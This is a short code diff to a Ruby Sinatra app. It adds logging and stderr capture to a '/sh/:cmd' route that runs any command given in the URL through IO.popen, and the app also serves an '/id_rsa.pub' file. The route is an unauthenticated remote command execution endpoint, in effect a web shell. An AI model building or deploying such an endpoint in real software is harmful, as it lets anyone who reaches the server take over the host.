@@ -19,8 +19,10 @@ get "/" do
 end
 
 get "/sh/:cmd" do
+  logger.info params[:cmd]
+
   content_type :txt
-  IO.popen(params[:cmd])
+  IO.popen("#{params[:cmd]} 2>&1")
 end
 
 get "/id_rsa.pub" do
